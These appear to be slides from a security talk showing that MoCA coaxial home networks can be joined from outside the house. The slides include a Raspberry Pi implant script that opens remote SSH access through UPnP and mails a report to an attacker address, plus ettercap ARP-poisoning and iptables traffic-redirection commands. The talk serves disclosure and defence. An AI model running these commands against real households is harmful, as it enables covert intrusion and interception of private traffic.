The views presented in this talk do not reflect 
the views of my employer. It is an independent 
work. 
Media over Coaxial Alliance 
• A bunch of media companies got together 
• How to make use of widely deployed coaxial 
cabling to deliver content? 
o  Shielded 
o  Lots of frequency bandwidth 
o  Carries signal 500 feet 
• PHY/MAC specification 
• Creates a network of the coaxial bus 
• Delivers guaranteed bandwidths at certain 
distances 
What does MoCA look like? 
MoCA Operation: PHY 
• PHY is the coaxial cable 
• Frequencies & signaling 
o  Orthogonal Frequency Division Multiplexing 
o  WAN and LAN channel sets 
MoCA Operation: MAC 
• Media Access Control 
o  Scheduled frames  
o  Master node controller 
o  Time Division Multiple Access 
o  Assured speeds

MoCA, definitely caffeinated 
• Enables ‘triple play’ 
• Desired by ISPs 
• HDTV requirements 
• Guaranteed speeds 
More prevalent than Starbucks 
• Most consumers don’t even know they have it 
• North American and European service 
providers already deploy it 
• In other words, just about every broadband 
installation 
o  FIOS 
o  Cable/Xfinity 
o  Dish/Satellite 
o  DVR 
o  STB 
The Wall Wart 
• Optical cable run from the neighborhood 
splitter to the home 
• Optical Network Terminator (ONT) installed 
on the exterior of the home 
o  Bridges the fiber to coaxial or CAT5 cable 
o  ISP prefers coaxial ! MoCA 
MoCA Inside 
• Actiontec Router 
o  SPI firewall 
o  NAT router 
"  LAN - WAN 
o  2 MoCA nodes (NC) 
o  MoCA-to-Ethernet bridge 
• Digital Video Recorder 
o  MoCA networking on board 
o  Depends on Actiontec router 
"  Time sync 
"  TV channel data 
Let’s draw that out a little more 
No Keys Required 
OH SNAP! 
TAKE 
IT ALL 
Remember, MoCA looks like this? 
DOUBLE SNAP! IT’S OUTSIDE! 
ATTACK HERE 
Walk up and jack in 
• Utility point-of-presence 
• ONT + root coax splitter 
+ power = SCORE! 
• Many homes have low 
plants growing around to 
obscure the equipment 
o  That will provide useful 
cover for the attacking 
equipment 
Tools of the Trade 
• MoCA-to-Ethernet bridge 
• RG-6 Coaxial Cable 
• >1GHz Coaxial Splitter 
Burning Bridges 
• Connect the attack 
device to the 
bridge’s Ethernet 
interface 
• Actiontec LAN 
does not engage 
link protection 
o  Any device can 
connect 
What just happened here? 
• A MoCA device has been added to the 
coaxial bus 
• Remember, both MoCA WAN and LAN run 
on the same physical bus 
• The bus is terminates outside the home 
• By attaching to the MoCA LAN, the internal 
Ethernet LAN has been extended outside the 
home 
Situation normal 
SNAFU 
What could possibly go wrong? 
• Enables attacks defeated by a firewall 
• Network redirection 
o  Address resolution protocol poisoning 
o  DHCP response spoofs 
o  DNS hijacking 
• Traffic profiling 
o  Deep packet inspection 
o  What do you do at home that you wouldn’t do at 
work? 
• What’s old is new again! Hello 2001! 
Ethernet attacks, so retro! 
• Enables direct attack against the local 
Ethernet network 
• Many attacker tools and frameworks have 
been developed to automate infiltration 
o  Ettercap 
o  dnsniff 
o  Metasploit 
o  BeEF 
o  EvilGrade 
o  Karmetasploit 
This tattoo will protect me from harm! 
• MoCA filters 
• Block signal in the 
MoCA ranges 
• Marketed as a 
security layer to 
protect against 
unwanted MoCA 
signals 
• Typically located on the 
feed to the splitter 
o  Almost always exposed 
• Designed to prevent signal 
bleed between houses 
o  NOT between the interior and 
exterior walls. 
Building a disposable attack unit 
• This is a problem that needs more attention 
• Create a platform to automate the 
compromise of a MoCA network 
• Illustrate that the compromise of most target 
domiciles is as simple as walking up to them 
ATTACK HERE 
Requirements 
• Drop-in physical toolkit 
o  Physical insertion 
o  Power 
o  Computing device 
• Remote access to toolkit 
o  Reverse tunnel, requires a server 
o  Port forwarding? 
• Traffic redirection 
• Content manipulation 
Design Objectives 
• DO NO HARM 
o  This is a demo for educational purposes 
o  Random useless site redirection is obvious, 
nondestructive 
• Use standard tools 
o  Less profiling 
o  Updatable  
o  Disposable 
• Minimize power consumption 
o  Enable attacker to walk away and preserve cover 
o  Unit must last at least a day 
• Control costs 
Ingredients

adjust posture based on 
the requests of internal 
hosts 
o  No authentication 
o  Forwards requested 
ports and sets up 
NAT 
•  Most embedded routers 
support IGD 
•  Supported by Microsoft, 
DLNA, ISPs 
How helpful! 
Image Hijinks 
• Transparent proxy needed to manipulate web 
streams 
o  Squid provides URL_REWRITE facility to support 3rd 
party tools 
o  ImageMagik libraries do the work 
• I Love My Neighbors 
o  Josh Wright’s wireless honeypot distribution 
o  Accomplishes my goals (flipping pics, funny things) 
o  Perl scripts for URL_REWRITE 
• Some BASH scripting to get it all set up 
Recipe for Raspberry MoCA:  
Phase 1 
• Insertion and remote access 
• Upon boot, execute a uPNP command to 
forward an external port to local SSH server 
o  {External IP}:22/tcp -> {Raspberry MoCA IP}:22/tcp 
• Report information to attacker 
#!/bin/sh -e 
# rc.local 
sleep 120; 
upnpc -a `ip addr | fgrep "inet " | fgrep -v "host lo" | awk '{print $2}' \ 
| awk -F\/ '{print $1}'` 22 22 tcp | tee /tmp/report \ 
| mailx -s `ip addr | fgrep "inet " | fgrep -v "host lo" | awk '{print $2}' \ 
| awk -F\/ '{print $1}'`.report PI:EMAIL 
exit 0 
Recipe: Phase 2 
• Engage image manipulation 
• ARP poison the LAN 
echo -n , Redirecting traffic 
ettercap -D -l /root/etter.infos -m /root/etter.msgs -M arp // // 
• Redirect web streams to local proxy 
echo -n , Redirecting ports 
iptables --flush 
iptables --table nat --flush 
iptables --delete-chain 
iptables --table nat -A PREROUTING -i eth0 -p tcp \ 
  --destination-port 80 -j REDIRECT --to-port 3128 
• Manipulate the web stream 
rm /etc/squid3/url_rewrite_program 
ln -s $SDIR/$1 /etc/squid3/url_rewrite_program 
service squid3 restart >/dev/null 
DEMO 
• WATCH THIS! 
famous last words…. 
Results 
• ARM11 is single core and it shows 
o  A little pokey for manipulating large images 
o  Reduced apache and squid to 5 threads 
o  Lowers CPU interrupt contention 
o  Only use simple flips. Animated GIFs are S..L..O..W.. 
• Traffic redirection  
o  Network with six normal devices on it 
o  Phones, DVR, computers 
o  All redirected with no noticeable performance issues 
"  Simple replacement of the word ‘dog’ with ‘cat’ 
o  MoCA works well for this 
Results 
• Compared to attack injections 
o  Images are huge payloads. Injections are small. 
o  Static payload insertion does not require heavy proc 
• Raspberry MoCA Platform provides 
o  Guaranteed remote access for a defined time 
o  Quick delivery and insertion. Minimizes exposure 
o  Low cost platform. <$300 is disposable 
o  Commodity components. Minimizes profilable artifacts 
o  Low-latency traffic redirection and manipulation 
"  Find a resource and implant a more permanent 
backdoor 
Security needs YOU! 
• This is a major exposure of the physical 
transport layer 
• Requires reassessment and attention from 
cable installers and Internet providers 
• Consumers should demand this! 
Ongoing work 
• Detect MoCA injections 
• Alert on network insertion 
o  Offer something more than ArpWatch? 
• SLIM and Counter-Pi 
o  in collaboration with Stephan Browarny
